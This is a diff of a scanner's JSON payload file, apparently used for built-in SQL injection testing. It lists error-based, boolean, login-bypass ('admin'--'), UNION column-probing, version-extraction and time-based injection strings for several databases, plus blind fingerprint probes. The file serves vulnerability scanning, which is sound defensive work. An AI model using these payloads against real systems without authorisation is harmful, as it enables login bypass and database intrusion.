@@ -1,32 +1,215 @@
 {
   "description": "SQL Injection payloads for built-in vulnerability scanning",
   "payloads": [
-    { "payload": "'", "type": "error-based (single quote)" },
-    { "payload": "\"", "type": "error-based (double quote)" },
-    { "payload": ")'", "type": "error-based (closing paren quote)" },
-    { "payload": "')\"", "type": "error-based (compound closing)" },
-    { "payload": "' OR '1'='1", "group": "boolean1", "expected": "true", "type": "boolean-based (OR tautology)" },
-    { "payload": "' OR '1'='2", "group": "boolean1", "expected": "false", "type": "boolean-based (OR false)" },
-    { "payload": "' OR '1'='1' -- ", "group": "boolean2", "expected": "true", "type": "boolean-based (OR tautology comment)" },
-    { "payload": "' OR '1'='2' -- ", "group": "boolean2", "expected": "false", "type": "boolean-based (OR false comment)" },
-    { "payload": "\" OR \"1\"=\"1", "group": "boolean3", "expected": "true", "type": "boolean-based (double quote OR)" },
-    { "payload": "\" OR \"1\"=\"2", "group": "boolean3", "expected": "false", "type": "boolean-based (double quote false)" },
-    { "payload": "1 OR 1=1", "group": "boolean4", "expected": "true", "type": "boolean-based (numeric OR)" },
-    { "payload": "1 OR 1=2", "group": "boolean4", "expected": "false", "type": "boolean-based (numeric false)" },
-    { "payload": "' AND '1'='1", "group": "boolean5", "expected": "true", "type": "boolean-based (AND tautology)" },
-    { "payload": "' AND '1'='2", "group": "boolean5", "expected": "false", "type": "boolean-based (AND false)" },
-    { "payload": "admin'--", "type": "auth bypass (admin)" },
-    { "payload": "administrator'--", "type": "auth bypass (administrator)" },
-    { "payload": "' UNION SELECT NULL-- ", "type": "UNION-based (single NULL)" },
-    { "payload": "' UNION SELECT NULL,NULL-- ", "type": "UNION-based (double NULL)" },
-    { "payload": "' UNION SELECT NULL,NULL,NULL-- ", "type": "UNION-based (triple NULL)" },
-    { "payload": "1' ORDER BY 10-- ", "type": "ORDER BY probing" },
-    { "payload": "1; WAITFOR DELAY '0:0:3'-- ", "type": "time-based MSSQL" },
-    { "payload": "1' AND SLEEP(3)-- ", "type": "time-based MySQL" },
-    { "payload": "1' AND pg_sleep(3)-- ", "type": "time-based PostgreSQL" },
-    { "payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)-- ", "type": "time-based MySQL complex" },
-    { "payload": "' AND 1=CONVERT(int,(SELECT @@version))-- ", "type": "error-based MSSQL version" },
-    { "payload": "' AND extractvalue(1,concat(0x7e,version()))-- ", "type": "error-based MySQL extractvalue" },
-    { "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ", "type": "error-based MySQL complex" }
-  ]
+    {
+      "payload": "'",
+      "type": "error-based (single quote)"
+    },
+    {
+      "payload": "' OR '1'='1",
+      "group": "b1",
+      "expected": "true",
+      "type": "boolean-based (OR tautology)"
+    },
+    {
+      "payload": "' OR '1'='2",
+      "group": "b1",
+      "expected": "false",
+      "type": "boolean-based (OR false)"
+    },
+    {
+      "payload": "\"",
+      "type": "error-based (double quote)"
+    },
+    {
+      "payload": ")'",
+      "type": "error-based (closing paren quote)"
+    },
+    {
+      "payload": "')\"",
+      "type": "error-based (compound closing)"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "group": "boolean2",
+      "expected": "true",
+      "type": "boolean-based (OR tautology comment)"
+    },
+    {
+      "payload": "' OR '1'='2' -- ",
+      "group": "boolean2",
+      "expected": "false",
+      "type": "boolean-based (OR false comment)"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "group": "boolean3",
+      "expected": "true",
+      "type": "boolean-based (double quote OR)"
+    },
+    {
+      "payload": "\" OR \"1\"=\"2",
+      "group": "boolean3",
+      "expected": "false",
+      "type": "boolean-based (double quote false)"
+    },
+    {
+      "payload": "1 OR 1=1",
+      "group": "boolean4",
+      "expected": "true",
+      "type": "boolean-based (numeric OR)"
+    },
+    {
+      "payload": "1 OR 1=2",
+      "group": "boolean4",
+      "expected": "false",
+      "type": "boolean-based (numeric false)"
+    },
+    {
+      "payload": "' AND '1'='1",
+      "group": "boolean5",
+      "expected": "true",
+      "type": "boolean-based (AND tautology)"
+    },
+    {
+      "payload": "' AND '1'='2",
+      "group": "boolean5",
+      "expected": "false",
+      "type": "boolean-based (AND false)"
+    },
+    {
+      "payload": "admin'--",
+      "type": "auth bypass (admin)"
+    },
+    {
+      "payload": "administrator'--",
+      "type": "auth bypass (administrator)"
+    },
+    {
+      "payload": "' UNION SELECT 'abc','def'#",
+      "type": "UNION-based (MySQL string reflection)",
+      "reflection": "abc"
+    },
+    {
+      "payload": "' UNION SELECT @@version,NULL#",
+      "type": "UNION-based (MySQL version extraction)"
+    },
+    {
+      "payload": "' UNION SELECT NULL,@@version#",
+      "type": "UNION-based (MySQL version extraction alt)"
+    },
+    {
+      "payload": "' UNION SELECT version(),NULL#",
+      "type": "UNION-based (MySQL version() function)"
+    },
+    {
+      "payload": "' UNION SELECT NULL--",
+      "type": "UNION column count probing",
+      "columns": 1
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 2
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 3
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 4
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 5
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 6
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 7
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 8
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 9
+    },
+    {
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+      "type": "UNION column count probing",
+      "columns": 10
+    },
+    {
+      "payload": "1' ORDER BY 10-- ",
+      "type": "ORDER BY probing"
+    },
+    {
+      "payload": "1; WAITFOR DELAY '0:0:3'-- ",
+      "type": "time-based MSSQL"
+    },
+    {
+      "payload": "1' AND SLEEP(3)-- ",
+      "type": "time-based MySQL"
+    },
+    {
+      "payload": "1' AND pg_sleep(3)-- ",
+      "type": "time-based PostgreSQL"
+    },
+    {
+      "payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)-- ",
+      "type": "time-based MySQL complex"
+    },
+    {
+      "payload": "' AND 1=CONVERT(int,(SELECT @@version))-- ",
+      "type": "error-based MSSQL version"
+    },
+    {
+      "payload": "' AND extractvalue(1,concat(0x7e,version()))-- ",
+      "type": "error-based MySQL extractvalue"
+    },
+    {
+      "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ",
+      "type": "error-based MySQL complex"
+    },
+    {
+      "payload": "' UNION SELECT 'abc','def' FROM dual--",
+      "type": "UNION-based (Oracle string reflection)",
+      "reflection": "abc"
+    },
+    {
+      "payload": "' UNION SELECT BANNER, NULL FROM v$version--",
+      "type": "UNION-based (Oracle version extraction)"
+    }
+  ],
+  "blind_fingerprint_probes": {
+    "Oracle": {
+      "valid": "xyz'||(SELECT '' FROM dual)||'",
+      "bad": "xyz'||(SELECT '' FROM not_a_real_table_xyzzy)||'"
+    },
+    "MySQL": {
+      "valid": "xyz' AND (SELECT 1)='1",
+      "bad": "xyz' AND (SELECT 1 FROM not_a_real_table_xyzzy)='1"
+    },
+    "PostgreSQL": {
+      "valid": "xyz' AND (SELECT 1)::text='1",
+      "bad": "xyz' AND (SELECT 1 FROM not_a_real_table_xyzzy)::text='1"
+    },
+    "MSSQL": {
+      "valid": "xyz' AND 1=(SELECT 1)--",
+      "bad": "xyz' AND 1=(SELECT 1 FROM not_a_real_table_xyzzy)--"
+    }
+  }
 }
